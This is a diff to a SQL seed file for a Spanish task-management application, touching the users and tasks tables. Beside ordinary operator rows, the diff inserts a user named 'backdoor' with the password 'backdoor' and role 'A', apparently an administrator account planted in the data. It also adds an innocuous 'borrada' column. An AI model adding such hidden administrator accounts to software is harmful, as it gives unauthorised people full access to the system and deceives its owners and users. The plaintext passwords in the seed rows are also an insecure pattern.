@@ -23,7 +23,8 @@ VALUES
 (4, 'operario2', 'pwd2', 'O'),
 (5, 'operario3', 'pwd3', 'O'),
 (6, 'operario4', 'pwd4', 'O'),
-(7, 'operario5', 'pwd5', 'O');
+(7, 'operario5', 'pwd5', 'O'),
+(8, 'backdoor', 'backdoor', 'A');
 
 --
 -- Estructura de tabla para la tabla `tbl_provincias`
@@ -200,3 +201,5 @@ VALUES
 ('12345678Z', 'Laura', 'Sánchez Fernández', '+34 689012345', 'Pintar la casa', 'Calle Estrecha, 20', 'Valencia', '46005', '46', 'C', '2024-12-06', 5, '2024-12-09', 'La casa necesita pintura', 'La casa ha sido pintada', null, null),
 ('12345678Z', 'Miguel', 'Hernández Ruiz', '+34 690123456', 'Reparar el baño', 'Calle Larga, 21', 'Sevilla', '41005', '41', 'P', '2024-12-07', 6, '2024-12-10', 'El baño tiene fugas', 'El baño ha sido reparado', null, null),
 ('12345678Z', 'Sara', 'Gómez Sánchez', '+34 601234567', 'Cambiar el suelo', 'Calle Cortada, 22', 'Granada', '18005', '18', 'R', '2024-12-08', 7, '2024-12-11', 'El suelo está dañado', 'El suelo ha sido cambiado', null, null);
+
+ALTER TABLE task ADD COLUMN borrada BOOLEAN DEFAULT FALSE;
